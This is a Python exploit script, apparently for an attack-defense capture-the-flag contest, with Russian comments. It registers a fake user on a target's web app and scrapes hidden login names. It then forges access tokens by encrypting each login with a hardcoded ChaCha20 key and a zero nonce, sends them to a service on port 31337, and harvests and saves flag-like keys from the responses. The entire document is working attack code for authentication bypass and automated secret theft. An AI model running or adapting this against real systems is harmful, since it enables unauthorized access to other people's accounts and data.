from pwn import *
import re
from Crypto.Cipher import ChaCha20
import sys
import os
import requests
from bs4 import BeautifulSoup
from faker import Faker

HOST = sys.argv[1] # sys.argv[1] # 3 or 4
HOST_2 = sys.argv[1]
URL_REGISTER = f"http://{HOST}:5000/register"
URL_LOGIN = f"http://{HOST}:5000/login"
URL_USERS = f"http://{HOST}:5000/users"
PORT = 31337
NONCE = b'\x00' * 8               
KEY = bytes([
    0x54, 0x68, 0x65, 0x20, 0x71, 0x75, 0x69, 0x63,
    0x6B, 0x20, 0x62, 0x72, 0x6F, 0x77, 0x6E, 0x20,
    0x66, 0x6F, 0x78, 0x20, 0x6A, 0x75, 0x6D, 0x70,
    0x73, 0x20, 0x6F, 0x76, 0x65, 0x72, 0x20, 0x6C
    ])          
      
KEY_PATTERN = re.compile(rb"[A-Z0-9]{31}=") #compile(rb"TEAM\d{3}_[A-Z0-9]{32}")
KEYS_FILE = "found_keys.txt"

def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r") as f:
            return set(line.strip() for line in f)
    return set()

def save_key(key):
    with open(KEYS_FILE, "a") as f:
        f.write(key + "\n")

def encrypt_login(login: str) -> bytes:
    cipher = ChaCha20.new(key=KEY, nonce=NONCE)
    return cipher.encrypt(login.encode())

def send_and_receive(encrypted_login: bytes) -> bytes:
    p = remote(HOST_2, PORT)
    try:
        p.recvuntil("Введите токен (HEX):".encode('utf-8'))  # строка -> байты
        p.sendline(encrypted_login)

        p.recvuntil(b'2.Exit')  # байтовая строка
        p.sendline(b'1')
        
        # Читаем весь ответ до закрытия соединения
        response = p.recvuntil(b'Menu')# recvall(timeout=5)  # Даем до 5 секунд на полный ответ
        
        p.close()
        
        return response
    except Exception as e:
        print(f"[!] Ошибка при получении ответа: {e}")
        p.close()
        return b""

def search_keys(data: bytes):
    return KEY_PATTERN.findall(data)

def _gen_user():
    faker = Faker()
    username = faker.user_name()
    password = faker.password(length=4)
    name = faker.first_name()
    surname = faker.last_name()
    return username, password, name, surname

def _register_and_login(session, username, password, name, surname):
    # Регистрация
    r = session.post(
        URL_REGISTER,
        data={"login": username, "password": password, "name": name, "surname": surname},
        allow_redirects=False,
        timeout=5
    )
    if r.status_code != 302 or r.headers.get("Location") != "/login":
        print("[!] Ошибка при регистрации")
        return False

    # Логин
    r = session.post(
        URL_LOGIN,
        data={"login": username, "password": password},
        allow_redirects=False,
        timeout=5
    )
    if r.status_code != 302 or "session" not in session.cookies:
        print("[!] Ошибка при логине")
        return False
    
    return True

def find_logins():
    s = requests.Session()
    username, password, name, surname = _gen_user()
    print(username, password, name, surname)
    if not _register_and_login(s, username, password, name, surname):
        return []

    try:
        r = s.get(URL_USERS, timeout=5)
    except Exception as e:
        print(f"[!] Ошибка при загрузке /users: {e}")
        return []

    soup = BeautifulSoup(r.text, 'html.parser')
    
    hidden_div = soup.find("div", {"style": "display:none"})
    if hidden_div:
        # Получаем текст из div и разбиваем его по запятым
        users_text = hidden_div.text.strip()
        logins = [login.strip() for login in users_text.split(",") if login.strip()]
        return logins

    return []


def main():
    print("found keys")
    set_key = load_keys()
    print("found login")
    LOGINS = find_logins()
    print(LOGINS)
    context.log_level = 'error'  # Отключаем лишний вывод от pwntools
    
    for login in LOGINS[-30:]:
        print(f'[+] Проверка логина: {login}')
        encrypted = encrypt_login(login)
        hex_encoded = encrypted.hex()

        print(f"Отправляем токен: {hex_encoded}")
        response = send_and_receive(hex_encoded.encode()) 

        if not response:
            print('Нет ответа или ошибка\n')
            continue
        print(f"Ответ сервера: {response.decode(errors='ignore')}")
        keys = search_keys(response)
        if keys:
            for key in keys:
                key_str = key.decode()
                if not key_str in set_key:
                    #set_key.add(key_str)
                    save_key(key_str)
                    print(f'Найден ключ: {key_str}\n', flush=True)
        else:
            print('Ключ не найден\n', flush=True)

if __name__ == '__main__':
    main()
